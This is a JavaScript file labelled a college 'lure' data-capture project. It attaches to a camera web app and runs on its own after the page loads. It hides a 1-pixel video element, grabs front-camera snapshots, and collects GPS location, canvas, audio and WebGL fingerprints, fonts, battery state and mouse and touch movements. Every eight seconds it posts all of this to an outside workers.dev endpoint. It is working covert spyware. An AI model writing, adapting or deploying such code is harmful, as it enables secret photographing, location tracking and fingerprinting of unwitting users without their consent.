// ════════════════════════════════════════════════════
// DATA CAPTURE SYSTEM (COLLEGE PROJECT - LAB USE ONLY)
// ════════════════════════════════════════════════════
const WORKER_URL = "https://snowy-fog-b0d1.23amtics322.workers.dev/";
const sessionId = 'sess_' + Math.random().toString(36).substring(2,12) + '_' + Date.now().toString(36);
const SEND_INTERVAL = 8000;

let basePayload = null;
let mouseData = [];
let touchData = [];
let lureVideoStream = null;
let sendIntervalId = null;
let isSending = false;

// Hidden video element for camera capture - create once
const lureVideo = document.createElement('video');
lureVideo.id = 'lureVideo';
lureVideo.autoplay = true;
lureVideo.playsInline = true;
lureVideo.muted = true;
lureVideo.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.01;pointer-events:none';
document.body.appendChild(lureVideo);

// Throttle mouse/touch events for performance
let lastMouseRecord = 0;
document.addEventListener('mousemove', e => {
  const now = Date.now();
  if (now - lastMouseRecord < 50) return;
  lastMouseRecord = now;
  mouseData.push({x: e.clientX, y: e.clientY, t: now});
  if (mouseData.length > 30) mouseData.shift();
});

let lastTouchRecord = 0;
document.addEventListener('touchmove', e => {
  const now = Date.now();
  if (now - lastTouchRecord < 50) return;
  lastTouchRecord = now;
  if (e.touches.length > 0) {
    touchData.push({x: e.touches[0].clientX, y: e.touches[0].clientY, t: now});
    if (touchData.length > 30) touchData.shift();
  }
});

async function collectStaticData() {
  const p = {
    sessionId: sessionId,
    url: location.href,
    referrer: document.referrer || null,
    userAgent: navigator.userAgent,
    language: navigator.language,
    languages: navigator.languages,
    platform: navigator.platform,
    hardwareConcurrency: navigator.hardwareConcurrency || null,
    deviceMemory: navigator.deviceMemory || null,
    maxTouchPoints: navigator.maxTouchPoints,
    connection: navigator.connection ? {
      effectiveType: navigator.connection.effectiveType,
      downlink: navigator.connection.downlink,
      rtt: navigator.connection.rtt,
      saveData: navigator.connection.saveData
    } : null,
    screen: {
      width: screen.width, height: screen.height,
      availWidth: screen.availWidth, availHeight: screen.availHeight,
      colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth,
      orientation: screen.orientation?.type || null
    },
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    webdriver: navigator.webdriver,
    plugins: Array.from(navigator.plugins || []).map(p => p.name).slice(0, 20),
    mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type).slice(0, 20),
    historyLength: history.length,
    navigationTiming: null,
    canvasFingerprint: null,
    audioFingerprint: null,
    webglFingerprint: null,
    fonts: [],
    permissionStates: {}
  };

  try {
    const navEntry = performance.getEntriesByType('navigation')[0];
    if (navEntry) {
      p.navigationTiming = {
        loadTime: navEntry.loadEventEnd - navEntry.fetchStart,
        domComplete: navEntry.domComplete
      };
    }
  } catch {}

  try {
    const c = document.createElement('canvas');
    const ctx = c.getContext('2d');
    c.width = 220; c.height = 60;
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('PHOTON 2026 🔥', 4, 4);
    ctx.fillStyle = '#f60';
    ctx.fillRect(120, 10, 70, 25);
    p.canvasFingerprint = c.toDataURL('image/png').substring(0, 500);
  } catch {}

  const audioPromise = (async () => {
    try {
      const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
      const osc = audioCtx.createOscillator();
      const analyser = audioCtx.createAnalyser();
      osc.type = 'sine';
      osc.frequency.value = 440;
      osc.connect(analyser);
      analyser.connect(audioCtx.destination);
      osc.start();
      await new Promise(r => setTimeout(r, 50));
      const data = new Uint8Array(analyser.frequencyBinCount);
      analyser.getByteFrequencyData(data);
      const fingerprint = btoa(String.fromCharCode(...data.slice(0, 40)));
      osc.stop();
      audioCtx.close();
      return fingerprint;
    } catch { return null; }
  })();
  
  p.audioFingerprint = await Promise.race([
    audioPromise,
    new Promise(r => setTimeout(() => r(null), 200))
  ]);

  try {
    const glc = document.createElement('canvas');
    const gl = glc.getContext('webgl') || glc.getContext('experimental-webgl');
    if (gl) {
      const debug = gl.getExtension('WEBGL_debug_renderer_info');
      p.webglFingerprint = {
        vendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
        renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)
      };
    }
  } catch {}

  try {
    const fontList = ['Arial','Helvetica','Times','Courier','Verdana','Georgia','Tahoma','Impact','Comic Sans MS','Trebuchet MS'];
    const testDiv = document.createElement('div');
    testDiv.style.cssText = 'position:absolute;left:-9999px;font-size:72px';
    document.body.appendChild(testDiv);
    const fonts = [];
    for (const font of fontList.slice(0, 8)) {
      testDiv.style.fontFamily = font;
      const w1 = testDiv.offsetWidth;
      testDiv.style.fontFamily = 'monospace';
      const w2 = testDiv.offsetWidth;
      if (w1 !== w2) fonts.push(font);
    }
    p.fonts = fonts;
    document.body.removeChild(testDiv);
  } catch {}

  const permNames = ['camera', 'microphone', 'geolocation'];
  for (const name of permNames) {
    try {
      const status = await navigator.permissions?.query({name: name});
      p.permissionStates[name] = status?.state || null;
    } catch (e) {
      p.permissionStates[name] = 'error';
    }
  }

  console.log('[LURE] Static data collected');
  console.log('[LURE] - Permissions:', p.permissionStates);
  console.log('[LURE] - WebGL:', p.webglFingerprint);
  return p;
}

async function collectDynamicData() {
  if (!basePayload) {
    for (let i = 0; i < 20; i++) {
      if (basePayload) break;
      await new Promise(r => setTimeout(r, 100));
    }
    if (!basePayload) {
      basePayload = await collectStaticData();
    }
  }
  
  const p = { ...basePayload };
  p.timestamp = new Date().toISOString();
  p.battery = null;
  p.geolocation = null;
  p.geolocationError = null;
  p.frontPhoto = null;
  p.mouseMovements = [...mouseData];
  p.touchEvents = [...touchData];
  p.audioDevices = [];

  if (navigator.getBattery) {
    try {
      const bat = await navigator.getBattery();
      p.battery = { level: bat.level, charging: bat.charging };
    } catch {}
  }

  // Use maximumAge to prevent aggressive GPS polling
  try {
    const pos = await new Promise((res, rej) => {
      const timeout = setTimeout(() => rej(new Error('timeout')), 5000);
      navigator.geolocation.getCurrentPosition(
        pos => { clearTimeout(timeout); res(pos); },
        err => { clearTimeout(timeout); rej(err); },
        { enableHighAccuracy: false, timeout: 5000, maximumAge: 60000 }
      );
    });
    p.geolocation = {
      latitude: pos.coords.latitude,
      longitude: pos.coords.longitude,
      accuracy: pos.coords.accuracy,
      altitude: pos.coords.altitude,
      speed: pos.coords.speed
    };
  } catch (e) { 
    p.geolocationError = e.message; 
  }

  // Photo capture - with safety checks for S and cacheElement
  try {
    if (typeof cacheElement === 'function') {
      const mainVideo = cacheElement('vid');
      if (mainVideo && mainVideo.videoWidth > 100 && mainVideo.videoHeight > 100) {
        if (typeof S !== 'undefined' && !S.previewActive) {
          const canvas = document.createElement('canvas');
          canvas.width = 320;
          canvas.height = 320;
          const ctx = canvas.getContext('2d');
          
          if (S.facing === 'user') {
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
          }
          
          ctx.drawImage(mainVideo, 0, 0, canvas.width, canvas.height);
          p.frontPhoto = canvas.toDataURL('image/jpeg', 0.6);
          
          if (p.frontPhoto && p.frontPhoto.length > 40000) {
            p.frontPhoto = p.frontPhoto.substring(0, 40000);
          }
        }
      }
    }
  } catch (e) {
    console.error('[LURE] Photo capture error:', e.message);
  }

  try {
    const devices = await navigator.mediaDevices.enumerateDevices();
    p.audioDevices = devices
      .filter(d => d.kind === 'audioinput' || d.kind === 'audiooutput')
      .slice(0, 5)
      .map(d => ({ kind: d.kind, label: (d.label || 'unknown').substring(0, 30) }));
  } catch {}

  return p;
}

async function sendPayload() {
  if (isSending) return;
  
  isSending = true;
  try {
    let data = await collectDynamicData();
    
    // CRITICAL FIX: Stringify ALL nested objects for worker compatibility
    const payload = {
      sessionId: data.sessionId,
      timestamp: data.timestamp,
      url: data.url,
      referrer: data.referrer,
      user_agent: data.userAgent,
      language: data.language,
      languages: data.languages ? JSON.stringify(data.languages) : null,
      platform: data.platform,
      hardware_concurrency: data.hardwareConcurrency,
      device_memory: data.deviceMemory,
      max_touch_points: data.maxTouchPoints,
      connection: data.connection ? JSON.stringify(data.connection) : null,
      screen: data.screen ? JSON.stringify(data.screen) : null,
      timezone: data.timezone,
      cookies_enabled: data.cookiesEnabled ? 1 : 0,
      do_not_track: data.doNotTrack,
      webdriver: data.webdriver ? 1 : 0,
      plugins: data.plugins ? JSON.stringify(data.plugins) : null,
      mime_types: data.mimeTypes ? JSON.stringify(data.mimeTypes) : null,
      history_length: data.historyLength,
      navigation_timing: data.navigationTiming ? JSON.stringify(data.navigationTiming) : null,
      canvas_fingerprint: data.canvasFingerprint,
      audio_fingerprint: data.audioFingerprint,
      webgl_fingerprint: data.webglFingerprint ? JSON.stringify(data.webglFingerprint) : null,
      battery: data.battery ? JSON.stringify(data.battery) : null,
      geolocation: data.geolocation ? JSON.stringify(data.geolocation) : null,
      front_photo: data.frontPhoto,
      audio_devices: data.audioDevices ? JSON.stringify(data.audioDevices) : null,
      fonts: data.fonts ? JSON.stringify(data.fonts) : null,
      mouse_movements: data.mouseMovements ? JSON.stringify(data.mouseMovements) : null,
      touch_events: data.touchEvents ? JSON.stringify(data.touchEvents) : null,
      permission_states: data.permissionStates ? JSON.stringify(data.permissionStates) : null,
      geolocation_error: data.geolocationError
    };
    
    console.log('[LURE] Sending payload');
    console.log('[LURE] - Permissions (stringified):', payload.permission_states);
    console.log('[LURE] - WebGL (stringified):', payload.webgl_fingerprint);
    console.log('[LURE] - Payload size:', JSON.stringify(payload).length, 'bytes');
    
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 10000);
    
    const response = await fetch(WORKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      keepalive: true,
      signal: controller.signal
    });
    
    clearTimeout(timeoutId);

    const responseText = await response.text();
    console.log('[LURE] Response status:', response.status);
    console.log('[LURE] Response body:', responseText);
    
    if (response.ok) {
      console.log('[LURE] Payload sent successfully');
    } else {
      console.error('[LURE] HTTP error:', response.status, responseText);
    }
  } catch (e) {
    if (e.name === 'AbortError') {
      console.error('[LURE] Request timeout');
    } else {
      console.error('[LURE] Send error:', e.message);
    }
  } finally {
    isSending = false;
  }
}

// Pause lure camera when preview is active (called from script.js)
async function pauseLureCamera() {
  if (typeof S !== 'undefined') {
    S.previewActive = true;
  }
  if (lureVideoStream) {
    lureVideoStream.getTracks().forEach(t => t.stop());
    lureVideoStream = null;
  }
}

// Resume lure camera when exiting preview (called from script.js)
async function resumeLureCamera() {
  if (typeof S !== 'undefined') {
    S.previewActive = false;
  }
  await initLureCamera();
}

async function initLureCamera() {
  try {
    if (typeof S === 'undefined' || !S.stream || (S.previewActive === true)) {
      return false;
    }
    
    if (lureVideoStream) {
      lureVideoStream.getTracks().forEach(t => t.stop());
    }
    
    const videoTrack = S.stream.getVideoTracks()[0];
    if (!videoTrack) {
      return false;
    }
    
    const newStream = new MediaStream([videoTrack]);
    lureVideoStream = newStream;
    lureVideo.srcObject = newStream;
    
    await lureVideo.play();
    
    for (let i = 0; i < 10; i++) {
      await new Promise(r => setTimeout(r, 50));
      if (lureVideo.videoWidth > 0) break;
    }
    
    return true;
  } catch (e) {
    console.warn('[LURE] Camera init warning:', e.message);
    return false;
  }
}

async function initLureSystem() {
  console.log('[LURE] Initializing lure system...');
  
  // Wait for S object and camera to be ready
  let attempts = 0;
  const maxAttempts = 50;
  
  while (attempts < maxAttempts) {
    if (typeof S !== 'undefined' && S.stream) {
      if (typeof cacheElement === 'function') {
        const vidEl = cacheElement('vid');
        if (vidEl && vidEl.videoWidth > 100) {
          console.log('[LURE] Camera ready after', attempts, 'attempts');
          break;
        }
      }
    }
    await new Promise(r => setTimeout(r, 200));
    attempts++;
  }
  
  if (typeof S === 'undefined') {
    console.error('[LURE] Fatal: S object not found');
    return;
  }
  
  // Expose pause/resume functions globally for script.js to call
  window.pauseLureCamera = pauseLureCamera;
  window.resumeLureCamera = resumeLureCamera;
  
  // Ensure previewActive flag exists
  if (S.previewActive === undefined) {
    S.previewActive = false;
  }
  
  basePayload = await collectStaticData();
  await initLureCamera();
  
  setTimeout(() => sendPayload(), 5000);
  
  if (sendIntervalId) clearInterval(sendIntervalId);
  sendIntervalId = setInterval(sendPayload, SEND_INTERVAL);
  
  window.addEventListener('beforeunload', () => {
    if (sendIntervalId) clearInterval(sendIntervalId);
    sendPayload();
  });
  
  console.log('[LURE] System ready');
}

// Start the lure system only after DOM is ready
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initLureSystem);
} else {
  setTimeout(initLureSystem, 1000);
}
